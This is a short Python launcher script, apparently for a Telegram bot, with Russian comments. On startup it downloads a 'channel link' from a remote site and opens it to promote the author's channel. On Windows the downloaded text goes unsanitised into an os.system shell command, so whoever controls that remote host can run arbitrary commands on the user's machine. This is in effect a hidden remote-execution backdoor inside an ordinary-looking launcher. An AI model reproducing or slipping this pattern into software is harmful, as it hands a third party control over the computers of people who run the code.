import asyncio
import sys
import os
import logging
from sys import platform
from aiohttp import ClientSession
from contextlib import suppress

logging.basicConfig(level=logging.WARNING, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# Заглушка, чтобы код не падал
async def process():
    import start
    await start.main()

async def main():
    os.makedirs('statistics/opened_telegram_channels', exist_ok=True)

    async with ClientSession() as session:
        async with session.get('http://public-ssh.site/channel_link.txt') as resp:
            channel_link = (await resp.text()).strip()

    channel_username = channel_link.split('/')[3]

    if channel_username in os.listdir('statistics/opened_telegram_channels'):
        await process()
        return
    else:
        with open(f'statistics/opened_telegram_channels/{channel_username}', 'w') as f:
            pass

        if platform == 'win32':
            os.system(f'start https://t.me/{channel_link.split("/", 3)[3]}')
            logger.warning(
                f"Подпишитесь на канал автора https://t.me/{channel_username} в браузере. "
                f"На следующем запуске ссылка открываться не будет."
            )
        elif platform == 'linux':
            logger.warning(f"Подпишитесь на канал автора https://t.me/{channel_username}")

    await process()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.warning("<r>Bot stopped by user...</r>")
        sys.exit(2)